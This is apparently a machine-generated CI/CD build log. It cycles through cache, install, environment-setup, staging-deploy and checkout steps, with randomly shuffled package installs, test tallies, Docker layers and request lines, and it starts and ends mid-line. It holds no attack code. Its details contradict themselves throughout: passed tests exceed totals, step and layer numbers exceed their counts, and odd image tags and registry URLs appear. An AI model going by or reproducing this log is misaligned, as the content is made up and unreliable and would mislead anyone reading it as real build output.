7.61s\n[12:45:52] DEBUG: Connection pool: 12 active\nFinished.\nDone.\nBuilding Docker image...\nnpm notice: created a lockfile\nCache invalidated: node_modules\nStep 6/19: Deploying\n  PASS: test_cache_hit (118ms)\nGenerating source maps...\n[12:45:53] INFO: Starting build process\nCache invalidated: node_modules\nnpm install: added 429 packages\nArtifact uploaded: build.tar.gz (29MB)\nUsing Python 3.10\nStep 11/18: Building\nReady.\npip: Collecting prettier\nOK\nTest Suites: 38 passed, 49 total\nConnection established\n  PASS: test_api_health (128ms)\n[12:45:53] DEBUG: Initializing service\nChecking out develop branch\n[12:45:53] DEBUG: Initializing service\n[12:45:53] DEBUG: Query executed in 32ms\nCache miss for key-5382\n[12:45:53] INFO: Processing request\nSnapshots: 2 passed, 11 total\nLayer 10/11: ENV command\nFinished.\nStep 3/18: Deploying\nPushing to registry...\n[12:45:53] DEBUG: Initializing service\nCache miss for key-7914\n[12:45:53] WARN: Deprecated API usage\nStep 8/16: Testing\n\u2713 Step 'checkout' succeeded\nStep 11/16: Deploying\n\u2717 build failed with exit code 90\n[12:45:53] INFO: Request completed\nHEAD is now at 8d818ef\n[12:45:53] INFO: Request completed\nnpm notice: package.json updated\nLayer 8/13: ENV command\nCompiling utils/index.js...\nStep 11/15: Deploying\nReady.\nTLS handshake completed\nUsing Python 3.12\nInstalling webpack@2.16.0\nCompiling src/utils.go...\n[12:45:53] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nMinifying main.js\n[12:45:53] DEBUG: Initializing service\npip: Downloading axios-1.17.tar.gz\nHEAD is now at c73bb7e\n  PASS: e2e/test_cache_hit.spec.js\nHEAD is now at ef7aefa\nChecking out develop branch\nStep 9/16: Testing\nBuilding Docker image...\nStep 20/22: Testing\nTransforming 123 files...\nNODE_ENV=production\nFetching submodules...\nnpm notice: package.json updated\nCompiling components/main.py...\nStep 13/22: Linting\nStep 14/24: Installing dependencies\n[12:45:53] WARN: Deprecated API usage\nPushing to registry...\nPlatform: win32-x64\npip: Collecting prettier\n[12:45:53] INFO: Cache refreshed\npip: Installing build dependencies...\npip: Downloading react-5.13.tar.gz\nImage pulled successfully\nnpm install: added 453 packages\nFetching from https://npmjs.org/package.json\nCoverage: 85% statements, 89% branches\nCache hit for key-1052\nArtifact uploaded: dist.zip (18MB)\nnpm notice: created a lockfile\nSnapshots: 10 passed, 18 total\nCache hit for key-3253\nArtifact uploaded: dist.zip (40MB)\nInstalling react@3.18.3\nLayer 10/9: ENV command\nConnection established\npip: Collecting react\nCache saved successfully\n[12:45:53] DEBUG: Memory usage: 805MB\nEnvironment: development\nMinifying main.js\nHEAD is now at 42659ca\nTLS handshake completed\nLoading...\nReady.\nTransforming 276 files...\nImage pulled successfully\nTLS handshake completed\nCompiling src/service.java...\n\u2713 Task completed in 4638ms\nStep 8/21: Testing\n[12:45:53] WARN: Deprecated API usage\n[12:45:53] DEBUG: Loading configuration\nCoverage: 88% statements, 85% branches\nFinished.\nPulling image: alpine:latest\nReady.\nStep 15/23: Testing\n[12:45:53] INFO: Processing request\nArtifact uploaded: dist.zip (92MB)\n[12:45:53] INFO: Connecting to database\nLoading...\nTLS handshake completed\nTime: 101.949s\nEnvironment: staging\nStep 10/20: Testing\nOptimizing 73 modules...\nWARNING: prettier has known vulnerabilities\npip: Downloading jest-3.6.tar.gz\nGET /status - 204 (45ms)\nPushing to registry...\nDone.\nCompiling components/utils.go...\n[12:45:53] DEBUG: Initializing service\nUsing Node.js 18.19.6\nTests: 50 passed, 472 total\nStep 2/15: Testing\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 package completed\nStep 19/21: Running migrations\n[12:45:53] INFO: Connecting to database\n[12:45:53] INFO: Processing request\n[12:45:53] WARN: Deprecated API usage\nCompiling utils/index.js...\nProcessing...\npip install: Successfully installed react-4.4\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_api_health (241ms)\nArtifact downloaded: 2MB\n[12:45:53] DEBUG: Memory usage: 971MB\nLayer 6/8: ENV command\nCreating production build...\n[12:45:53] DEBUG: Initializing service\nWARNING: jest has known vulnerabilities\nAlready up to date.\nFinished.\nCreating production build...\nAlready up to date.\nCache hit for key-3086\nReady.\nArtifact downloaded: 35MB\n\u2717 build failed with exit code 77\n[12:45:53] DEBUG: Connection pool: 16 active\nCompiling utils/index.js...\nStep 12/25: Running migrations\nDone.\n\u2713 Task completed in 3735ms\nRan 182 tests in 23s\nnpm notice: created a lockfile\nArtifact downloaded: 41MB\nProcessing...\nOK\n\u2717 build failed with exit code 92\nArtifact downloaded: 10MB\nCoverage: 70% statements, 68% branches\nFetching from https://npmjs.org/package.json\nTests: 285 passed, 100 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nTime: 56.72s\nFetching submodules...\nSwitched to branch 'bugfix/task-823'\nWARNING: eslint has known vulnerabilities\n[12:45:53] INFO: Processing request\nCompiling components/main.py...\nRan 158 tests in 14s\nLoading...\nDone.\nnpm install: resolved 626 packages\n=== Step restore_cache completed ===\n=== Step: install_dependencies ===\nPulling image: python:3.11\n[12:45:53] INFO: Request completed\n\u2713 Task completed in 2094ms\nBuilding Docker image...\nyarn add: Done in 7.19s\nException: NullPointerException\n\u2713 deploy completed\npip install: Successfully installed webpack-2.19\nyarn add: Done in 5.13s\nCompiling utils/utils.go...\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 14/25: Linting\nPOST /upload - 200 (338ms)\nEnvironment: test\nFinished.\nLayer 4/12: ENV command\nChecking out main branch\nPOST /api - 201 (177ms)\n[12:45:53] DEBUG: Loading configuration\nInstalling express@2.10.1\nGenerating source maps...\nCache invalidated: build\nBundling styles.js\nUsing Node.js 17.4.7\nnpm notice: created a lockfile\nStep 11/23: Linting\nTest Suites: 17 passed, 8 total\nTLS handshake completed\nLoading...\nImage pulled successfully\nLoading...\nCompiling src/index.js...\nException: TypeError\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:53] DEBUG: Loading configuration\n\u2713 package completed\nCompleted.\n[12:45:53] WARN: Deprecated API usage\n[12:45:53] DEBUG: Loading configuration\nInstalling lodash@4.9.6\nCreating production build...\nPushing to registry...\nLayer 5/13: COPY command\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:45:53] INFO: Processing request\nFinished.\n[12:45:53] DEBUG: Query executed in 1ms\nSwitched to branch 'feature/task-465'\nStep 20/16: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 5/18: Linting\nStep 20/15: Linting\nTransforming 428 files...\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/main.py...\n[12:45:53] INFO: Connecting to database\n  PASS: unit/test_cache_hit.spec.js\nVerifying...\nInstalling webpack@2.9.8\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nWaiting...\n  PASS: integration/test_auth_login.spec.js\nStep 17/21: Installing dependencies\nPOST /data - 202 (418ms)\nnpm notice: package.json updated\n[12:45:53] DEBUG: Query executed in 58ms\nException: ValueError\nCompiling src/service.java...\nCompiling lib/index.js...\nStep 1/15: Building\nnpm install: added 190 packages\n[12:45:53] DEBUG: Loading configuration\nLoading...\nPulling image: node:3.11\n[12:45:53] DEBUG: Loading configuration\nStep 7/19: Building\nCompleted.\n[12:45:53] INFO: Request completed\nCreating production build...\nCompiling src/handler.rs...\nWaiting...\n[12:45:53] WARN: Deprecated API usage\nCompiling lib/utils.go...\nTests: 289 passed, 318 total\nVerifying...\nFinished.\nConnection established\n[12:45:53] INFO: Request completed\nHEAD is now at 27049a1\nFinished.\nFetching submodules...\n\u2713 All checks passed\nTLS handshake completed\n[12:45:53] WARN: Deprecated API usage\nWaiting...\n[12:45:53] DEBUG: Initializing service\n[12:45:53] WARN: Deprecated API usage\n[12:45:53] DEBUG: Query executed in 45ms\nConnection established\nCache miss for key-6984\nChecking out master branch\n[12:45:53] DEBUG: Initializing service\n\u2713 All checks passed\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Step 'install' succeeded\nCreating production build...\nCompiling components/service.java...\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/app.ts...\nWARNING: react has known vulnerabilities\n  PASS: e2e/test_db_connect.spec.js\n\u2713 Task completed in 2810ms\n[12:45:53] INFO: Connecting to database\nImage pulled successfully\n[12:45:53] INFO: Starting build process\nOK\nHEAD is now at 01db4ce\nReady.\nAlready up to date.\nLoading...\nCache hit for key-6549\nSnapshots: 17 passed, 2 total\n[12:45:53] DEBUG: Initializing service\nTest Suites: 31 passed, 40 total\nSuccess!\nFAILED: test_auth_login\nCreating production build...\nnpm install: added 171 packages\nInstalling prettier@4.3.6\nFinished.\nOptimizing 18 modules...\n  PASS: e2e/test_cache_hit.spec.js\nInstalling webpack@3.20.3\nTests: 460 passed, 241 total\n  PASS: test_auth_login (68ms)\nFetching from https://githubusercontent.com/package.json\nLayer 2/14: RUN command\nAlready up to date.\n[12:45:53] INFO: Cache refreshed\npip install: Successfully installed webpack-1.2\n\u2713 Task completed in 3642ms\nTLS handshake completed\nArtifact uploaded: build.tar.gz (30MB)\nFinished.\npip: Collecting react\nyarn add: Done in 9.16s\nSuccess!\nStep 1/20: Running migrations\nCache saved successfully\n\u2713 All checks passed\nNODE_ENV=production\nBundling runtime.js\nGenerating source maps...\n[12:45:53] INFO: Starting build process\nPOST /data - 200 (262ms)\n\u2713 All checks passed\nnpm install: resolved 235 packages\nnpm install: added 452 packages\nCache saved successfully\n[12:45:53] INFO: Starting build process\nyarn add: Done in 18.95s\nFetching from https://github.com/package.json\nnpm install: resolved 263 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:53] WARN: Deprecated API usage\nTest Suites: 42 passed, 24 total\n[12:45:53] INFO: Cache refreshed\n[12:45:53] ERROR: Connection failed\nBuilding Docker image...\nCompiling lib/service.java...\nTime: 106.732s\n[12:45:53] DEBUG: Loading configuration\n  PASS: unit/test_auth_login.spec.js\nUsing Node.js 18.8.6\nStep 4/16: Installing dependencies\nCache restored successfully (486MB)\nFAILED: test_auth_login\nPushing to registry...\n[12:45:53] INFO: Starting build process\nCompiling utils/service.java...\nBundling styles.js\nTests: 282 passed, 472 total\nyarn add: Done in 10.5s\npip: Collecting axios\nCache hit for key-9124\nSwitched to branch 'hotfix/task-661'\nArtifact uploaded: dist.zip (89MB)\nCache restored successfully (496MB)\nStep 15/22: Testing\nTime: 29.16s\nCompiling utils/handler.rs...\nStep 15/19: Deploying\npip: Collecting webpack\n[12:45:53] INFO: Request completed\nPushing to registry...\nEnvironment: test\nSnapshots: 32 passed, 19 total\n[12:45:53] INFO: Processing request\nPushing to registry...\n  PASS: test_cache_hit (418ms)\n=== Step install_dependencies completed ===\n=== Step: setup_environment ===\nTime: 106.154s\n[12:45:53] WARN: Deprecated API usage\n  PASS: test_cache_hit (8ms)\nReady.\nCreating production build...\nGenerating source maps...\nUploading artifact 'coverage' (18 files)\nCache hit for key-6136\n[12:45:53] DEBUG: Memory usage: 501MB\nInstalling express@1.11.8\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (58MB)\nInstalling prettier@5.9.6\nPlatform: linux-x64\nPlatform: linux-x64\n[12:45:53] DEBUG: Initializing service\nyarn add: Done in 9.4s\n[12:45:53] INFO: Cache refreshed\nLoading...\nInstalling prettier@5.7.2\npip: Installing build dependencies...\nBundling runtime.js\nCache miss for key-8686\nCache saved successfully\nCompiling utils/index.js...\nGET /api - 200 (100ms)\nProcessing...\nPulling image: alpine:latest\nFetching from https://amazonaws.com/package.json\nFetching submodules...\nCompleted.\nCoverage: 85% statements, 80% branches\nGenerating source maps...\nImage pulled successfully\n\u2713 deploy completed\n[12:45:53] WARN: Deprecated API usage\nException: NullPointerException\nStep 18/20: Linting\nRan 128 tests in 15s\n\u2713 Task completed in 2748ms\n[12:45:53] DEBUG: Query executed in 86ms\npip: Downloading prettier-5.2.tar.gz\nDone.\nCache restored successfully (333MB)\nPulling image: python:latest\nCoverage: 100% statements, 71% branches\nnpm notice: package.json updated\npip install: Successfully installed prettier-3.11\nWARNING: lodash has known vulnerabilities\n[12:45:53] DEBUG: Memory usage: 364MB\nStep 11/21: Deploying\nRan 47 tests in 18s\nLoading...\nUsing Python 3.10\nArtifact uploaded: dist.zip (47MB)\nUsing Python 3.11\nnpm install: resolved 998 packages\nReady.\n\u2713 validate completed\nnpm install: resolved 1296 packages\nBuilding Docker image...\nHEAD is now at 340777c\nCompiling src/main.py...\nCache miss for key-4256\nVerifying...\nAlready up to date.\n[12:45:53] DEBUG: Initializing service\nBuilding Docker image...\nAlready up to date.\nGET /health - 204 (49ms)\nNODE_ENV=production\nStep 3/20: Deploying\n[12:45:53] ERROR: Connection failed\nTime: 6.754s\nyarn add: Done in 5.68s\nConnection established\nCompleted.\nImage pulled successfully\nArtifact uploaded: dist.zip (41MB)\n\u2713 validate completed\n[12:45:53] DEBUG: Initializing service\nPushing to registry...\nCompleted.\nyarn add: Done in 25.83s\nCache restored successfully (40MB)\n\u2713 deploy completed\nInstalling webpack@1.13.8\nReady.\nArtifact downloaded: 22MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\npip: Collecting react\nFinished.\nCompleted.\nInstalling react@2.0.6\nCreating production build...\n[12:45:53] INFO: Cache refreshed\nStep 7/17: Linting\nStep 3/23: Linting\nWaiting...\nHEAD is now at 669014b\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:53] INFO: Cache refreshed\n\u2717 build failed with exit code 19\nCache invalidated: build\nUploading artifact 'build' (36 files)\nPOST /upload - 200 (10ms)\nWaiting...\nGET /api - 204 (36ms)\n[12:45:53] DEBUG: Query executed in 54ms\n[12:45:53] INFO: Request completed\nCompleted.\nImage pulled successfully\nPOST /upload - 200 (209ms)\n\u2713 test completed\n[12:45:53] INFO: Connecting to database\nPOST /data - 200 (293ms)\nReady.\n[12:45:53] INFO: Processing request\nGenerating source maps...\nnpm install: resolved 1099 packages\nnpm install: resolved 1555 packages\nCompiling utils/handler.rs...\nArtifact uploaded: dist.zip (15MB)\nTests: 130 passed, 55 total\nGenerating source maps...\nOptimizing 98 modules...\nOK\nStep 2/15: Running migrations\n\u2717 build failed with exit code 60\nGET /api - 201 (49ms)\nUsing Python 3.10\n[12:45:53] WARN: Deprecated API usage\nLayer 1/12: ENV command\n\u2713 Step 'build' succeeded\nStep 11/22: Installing dependencies\n[12:45:53] INFO: Request completed\npip install: Successfully installed react-1.4\n\u2713 build completed\n[12:45:53] DEBUG: Connection pool: 2 active\nTests: 193 passed, 465 total\n\u2713 build completed\nImage pulled successfully\nGET /status - 201 (81ms)\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPlatform: linux-x64\n  PASS: test_api_health (424ms)\nWARNING: jest has known vulnerabilities\nGET /status - 201 (41ms)\nFetching submodules...\nTransforming 273 files...\nInstalling webpack@4.7.9\nCache miss for key-4815\nImage pulled successfully\n[12:45:53] INFO: Request completed\nEnvironment: staging\nSuccess!\n[12:45:53] INFO: Connecting to database\nBuilding Docker image...\nTime: 105.341s\n[12:45:53] WARN: Deprecated API usage\nTransforming 937 files...\nConnection established\nWaiting...\nTLS handshake completed\nPulling image: node:3.11\nNODE_ENV=development\nPOST /api - 201 (377ms)\nEnvironment: test\nBuilding Docker image...\nPulling image: node:latest\nStep 19/22: Running migrations\n[12:45:53] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:53] DEBUG: Initializing service\nCreating production build...\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nChecking out master branch\nStep 8/21: Running migrations\n[12:45:53] DEBUG: Loading configuration\nStep 9/24: Building\nLayer 3/8: ENV command\nOptimizing 92 modules...\nCompiling lib/utils.go...\nUsing Node.js 19.18.0\nCompiling src/app.ts...\n[12:45:53] INFO: Cache refreshed\nConnection established\nCache invalidated: dependencies\nNODE_ENV=test\nnpm install: added 358 packages\n[12:45:53] DEBUG: Connection pool: 4 active\nTest Suites: 35 passed, 41 total\n[12:45:53] ERROR: Connection failed\n[12:45:53] WARN: Deprecated API usage\n[12:45:53] DEBUG: Query executed in 97ms\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (5MB)\nCompiling utils/app.ts...\nCache restored successfully (408MB)\nCreating production build...\nWaiting...\nStep 8/18: Installing dependencies\nFinished.\n=== Step setup_environment completed ===\n=== Step: deploy_staging ===\n[12:45:53] INFO: Cache refreshed\nTests: 73 passed, 301 total\nGenerating source maps...\n  PASS: test_auth_login (192ms)\nCompleted.\nTime: 87.117s\nHEAD is now at a1cdd8e\nSwitched to branch 'feature/task-446'\nCache saved successfully\nStep 16/15: Building\nStep 4/25: Building\nPlatform: win32-x64\nCompiling utils/utils.go...\nLoading...\nPlatform: linux-x64\nGenerating source maps...\nTest Suites: 43 passed, 23 total\npip install: Successfully installed jest-4.10\nCreating production build...\nStep 20/19: Building\nyarn add: Done in 19.47s\nStep 13/23: Building\nStep 3/17: Running migrations\nLayer 2/10: RUN command\nyarn add: Done in 9.29s\n[12:45:53] INFO: Starting build process\n[12:45:53] INFO: Request completed\nAlready up to date.\nCompiling lib/index.js...\nFetching from https://pypi.org/package.json\nOK\nStep 1/24: Linting\nBuilding Docker image...\nTime: 53.434s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: added 308 packages\nTLS handshake completed\nCache miss for key-5179\nPlatform: darwin-arm64\nInstalling react@2.14.10\nLayer 4/12: RUN command\nnpm install: resolved 483 packages\nCache hit for key-4514\npip: Collecting react\n\u2713 All checks passed\nTransforming 896 files...\nPOST /upload - 201 (193ms)\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\nFetching submodules...\n[12:45:53] WARN: Deprecated API usage\nCache hit for key-9759\nLoading...\nChecking out master branch\nCompiling src/handler.rs...\n  PASS: integration/test_auth_login.spec.js\nSuccess!\n[12:45:53] INFO: Request completed\n[12:45:53] DEBUG: Query executed in 33ms\nArtifact uploaded: build.tar.gz (38MB)\nConnection established\n[12:45:53] DEBUG: Query executed in 52ms\nWARNING: jest has known vulnerabilities\nEnvironment: development\n[12:45:53] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /data - 201 (209ms)\nPOST /upload - 202 (454ms)\nyarn add: Done in 6.51s\npip: Collecting eslint\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\nOptimizing 79 modules...\n[12:45:53] INFO: Cache refreshed\nCache miss for key-6564\nBundling main.css\nPushing to registry...\nTLS handshake completed\nyarn add: Done in 29.76s\nnpm notice: created a lockfile\nSuccess!\npip install: Successfully installed axios-4.18\nTime: 15.288s\nCoverage: 89% statements, 89% branches\nnpm install: added 161 packages\nUsing Python 3.9\n[12:45:53] INFO: Cache refreshed\n[12:45:53] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (79MB)\nFAILED: test_api_health\n[12:45:53] DEBUG: Memory usage: 1213MB\nUsing Python 3.10\npip: Downloading express-1.14.tar.gz\n\u2713 validate completed\n\u2713 validate completed\n[12:45:53] DEBUG: Initializing service\nBundling runtime.js\nnpm install: added 313 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\nPlatform: linux-x64\npip: Collecting jest\n[12:45:53] INFO: Starting build process\nTest Suites: 44 passed, 17 total\nStep 9/18: Linting\nPulling image: alpine:latest\n\u2713 Step 'setup' succeeded\n\u2713 validate completed\nCompleted.\nCache restored successfully (120MB)\n[12:45:53] DEBUG: Query executed in 26ms\nGET /api - 201 (75ms)\nChecking out develop branch\n[12:45:53] WARN: Deprecated API usage\nInstalling lodash@4.11.1\nProcessing...\nOK\nnpm notice: package.json updated\nCompiling lib/main.py...\n[12:45:53] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-9468\nFinished.\nFinished.\nCompiling lib/index.js...\nCache saved successfully\nWaiting...\nPushing to registry...\nPlatform: darwin-arm64\nStep 5/18: Deploying\nOK\n\u2717 build failed with exit code 10\nCache saved successfully\nWARNING: express has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nCompiling components/utils.go...\nPOST /api - 202 (358ms)\nPlatform: darwin-arm64\nCompiling components/main.py...\nCache hit for key-6822\nyarn add: Done in 16.44s\nTLS handshake completed\nCoverage: 81% statements, 75% branches\nCache invalidated: build\nnpm notice: package.json updated\nCreating production build...\nnpm install: resolved 305 packages\nProcessing...\nPlatform: darwin-arm64\n\u2717 build failed with exit code 74\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\nOK\nTests: 332 passed, 409 total\npip: Installing build dependencies...\nChecking out master branch\nyarn add: Done in 19.26s\nUsing Node.js 18.18.9\n  PASS: test_auth_login (75ms)\n[12:45:53] DEBUG: Memory usage: 1015MB\nMinifying vendor.js\nyarn add: Done in 13.44s\nTime: 42.564s\nHEAD is now at e64547f\n\u2717 build failed with exit code 16\n[12:45:53] INFO: Starting build process\nTime: 12.794s\n[12:45:53] WARN: Deprecated API usage\nTLS handshake completed\npip: Installing build dependencies...\nPlatform: win32-x64\npip: Downloading jest-2.15.tar.gz\nBundling styles.css\nFinished.\npip: Collecting jest\nVerifying...\nConnection established\n[12:45:53] DEBUG: Query executed in 61ms\nLayer 10/10: RUN command\nPOST /api - 200 (183ms)\n\u2713 All checks passed\nStep 19/24: Building\nBuilding Docker image...\nStep 4/17: Installing dependencies\npip: Installing build dependencies...\nConnection established\nFinished.\n\u2713 All checks passed\nGenerating source maps...\nSnapshots: 32 passed, 33 total\nConnection established\nInstalling jest@3.11.5\n[12:45:53] INFO: Starting build process\nCompiling components/utils.go...\nCache saved successfully\nHEAD is now at 69e90c8\n\u2713 Step 'checkout' succeeded\nGenerating source maps...\npip install: Successfully installed express-3.11\npip install: Successfully installed express-4.18\nRan 178 tests in 6s\nStep 1/16: Linting\npip: Collecting axios\nnpm notice: created a lockfile\n=== Step deploy_staging completed ===\n=== Step: save_cache ===\n[12:45:53] INFO: Connecting to database\nUsing Node.js 18.4.3\n[12:45:53] DEBUG: Loading configuration\nyarn add: Done in 2.99s\nTLS handshake completed\nCompleted.\nyarn add: Done in 7.16s\n\u2713 All checks passed\n\u2713 package completed\nImage pulled successfully\nnpm notice: created a lockfile\nStep 17/15: Running migrations\nArtifact uploaded: build.tar.gz (15MB)\n[12:45:53] WARN: Deprecated API usage\nNODE_ENV=production\n[12:45:53] DEBUG: Initializing service\nFAILED: test_cache_hit\nEnvironment: production\nPushing to registry...\nTransforming 885 files...\nPushing to registry...\n  PASS: integration/test_user_create.spec.js\n\u2713 Task completed in 3923ms\nStep 1/24: Linting\n[12:45:53] DEBUG: Initializing service\nArtifact uploaded: dist.zip (72MB)\n[12:45:53] INFO: Connecting to database\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Task completed in 468ms\nTests: 83 passed, 383 total\nCache miss for key-5590\nUploading artifact 'coverage' (35 files)\nCompiling utils/utils.go...\nArtifact uploaded: dist.zip (18MB)\nTests: 308 passed, 179 total\nGET /api - 201 (73ms)\nOK\nnpm notice: package.json updated\nUsing Python 3.12\nStep 16/22: Installing dependencies\nStep 17/22: Testing\n\u2717 build failed with exit code 55\nMinifying main.js\nTransforming 108 files...\nStep 11/24: Running migrations\nFetching from https://registry.npmjs.org/package.json\nCoverage: 94% statements, 66% branches\nCompleted.\npip install: Successfully installed eslint-4.3\npip: Installing build dependencies...\n[12:45:53] INFO: Connecting to database\nTLS handshake completed\nBuilding Docker image...\nFinished.\nPushing to registry...\n  PASS: unit/test_cache_hit.spec.js\nUploading artifact 'coverage' (9 files)\nFetching from https://github.com/package.json\n[12:45:53] DEBUG: Memory usage: 613MB\nTime: 57.855s\nCache saved successfully\nStep 16/21: Running migrations\nTests: 171 passed, 229 total\nRan 104 tests in 27s\n[12:45:53] INFO: Request completed\nArtifact downloaded: 47MB\nTest Suites: 19 passed, 21 total\nnpm install: resolved 988 packages\nCache saved successfully\n\u2713 Task completed in 4619ms\nUsing Node.js 20.8.6\nMinifying vendor.js\n[12:45:53] DEBUG: Initializing service\n[12:45:53] INFO: Connecting to database\nCoverage: 91% statements, 74% branches\nOptimizing 45 modules...\nPulling image: node:18\nCache saved successfully\n[12:45:53] INFO: Cache refreshed\nDone.\nCache saved successfully\nUploading artifact 'build' (33 files)\nStep 19/16: Installing dependencies\n\u2713 package completed\nStep 19/25: Building\nFetching from https://gcr.io/package.json\nLoading...\nEnvironment: development\nyarn add: Done in 19.24s\nConnection established\n\u2713 Task completed in 3978ms\nCompleted.\n[12:45:53] INFO: Cache refreshed\nSuccess!\n[12:45:53] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 19 passed, 8 total\nFetching submodules...\nTest Suites: 29 passed, 20 total\n  PASS: test_api_health (315ms)\nPOST /data - 201 (103ms)\nPulling image: python:3.11\nOK\nCompleted.\nStep 20/22: Linting\nStep 1/25: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\n\u2713 All checks passed\nChecking out develop branch\nCache miss for key-7974\n\u2713 Step 'setup' succeeded\nCache invalidated: node_modules\nWARNING: axios has known vulnerabilities\nLayer 1/10: ENV command\nPushing to registry...\nSnapshots: 34 passed, 15 total\n\u2713 Task completed in 4985ms\nFetching from https://githubusercontent.com/package.json\nEnvironment: test\n[12:45:53] INFO: Starting build process\nyarn add: Done in 6.65s\nSuccess!\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (34MB)\nCoverage: 92% statements, 93% branches\nWARNING: axios has known vulnerabilities\nLayer 3/9: COPY command\nChecking out master branch\nException: TypeError\nTest Suites: 25 passed, 32 total\nUsing Python 3.9\nUsing Python 3.10\nCompiling src/service.java...\nStep 8/18: Testing\nCache saved successfully\nTest Suites: 36 passed, 21 total\nCompiling components/utils.go...\nStep 14/21: Linting\nMinifying vendor.js\nnpm install: resolved 1378 packages\nProcessing...\n[12:45:53] INFO: Request completed\nyarn add: Done in 14.9s\nCompiling utils/handler.rs...\n\u2713 Step 'test' succeeded\nCompiling lib/index.js...\n[12:45:53] DEBUG: Query executed in 86ms\nBundling main.css\nStep 20/19: Testing\n[12:45:53] DEBUG: Loading configuration\nFinished.\nCoverage: 71% statements, 71% branches\nInstalling prettier@4.10.5\n  PASS: test_user_create (373ms)\nFAILED: test_cache_hit\nSnapshots: 32 passed, 37 total\nTransforming 533 files...\nStep 14/17: Building\n\u2717 build failed with exit code 110\nCompleted.\nChecking out master branch\nException: ValueError\nBundling main.js\n\u2713 package completed\n  PASS: test_cache_hit (263ms)\nyarn add: Done in 3.63s\nOK\npip install: Successfully installed prettier-2.16\npip: Downloading express-5.10.tar.gz\nProcessing...\nWARNING: express has known vulnerabilities\n[12:45:53] INFO: Starting build process\nStep 20/25: Linting\nOptimizing 47 modules...\nnpm install: added 231 packages\nNODE_ENV=test\nCreating production build...\nUsing Python 3.11\npip: Installing build dependencies...\nyarn add: Done in 18.66s\nPOST /data - 202 (167ms)\n[12:45:53] WARN: Deprecated API usage\nRan 13 tests in 53s\nnpm install: added 418 packages\nInstalling prettier@3.9.0\nDone.\nTransforming 729 files...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 7/23: Running migrations\nTransforming 175 files...\nPushing to registry...\nSuccess!\n[12:45:53] WARN: Deprecated API usage\nGenerating source maps...\nyarn add: Done in 29.49s\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: express has known vulnerabilities\nSuccess!\nAlready up to date.\nVerifying...\nCache invalidated: node_modules\nReady.\n=== Step save_cache completed ===\n=== Step: checkout ===\nStep 1/16: Linting\nnpm install: added 41 packages\nCache hit for key-5616\nCreating production build...\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGET /api - 204 (53ms)\nnpm install: resolved 193 packages\nImage pulled successfully\nFetching from https://amazonaws.com/package.json\nTransforming 699 files...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:53] WARN: Deprecated API usage\nWARNING: react has known vulnerabilities\n[12:45:53] DEBUG: Query executed in 85ms\nWARNING: eslint has known vulnerabilities\nOptimizing 43 modules...\nCache saved successfully\nRan 61 tests in 35s\nCache saved successfully\nStep 20/23: Deploying\nPlatform: darwin-arm64\nCache hit for key-4041\nArtifact downloaded: 27MB\nWARNING: webpack has known vulnerabilities\n[12:45:53] INFO: Connecting to database\nStep 5/24: Linting\nWARNING: webpack has known vulnerabilities\nWARNING: webpack has known vulnerabilities\nPulling image: alpine:18\npip: Downloading lodash-4.14.tar.gz\nWARNING: react has known vulnerabilities\nFetching submodules...\nStep 15/23: Running migrations\nInstalling jest@4.20.10\n  PASS: unit/test_api_health.spec.js\nDone.\nPlatform: darwin-arm64\nyarn add: Done in 26.48s\nVerifying...\nHEAD is now at 24bec07\n\u2713 validate completed\n[12:45:53] INFO: Cache refreshed\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: lodash has known vulnerabilities\nUsing Node.js 17.14.4\nPOST /data - 202 (27ms)\nUploading artifact 'dist' (21 files)\nFAILED: test_api_health\nnpm notice: package.json updated\npip: Installing build dependencies...\nGET /health - 200 (40ms)\nMinifying vendor.js\nPushing to registry...\nSwitched to branch 'hotfix/task-862'\n[12:45:53] DEBUG: Connection pool: 7 active\nCreating production build...\nnpm notice: created a lockfile\nVerifying...\n[12:45:53] INFO: Processing 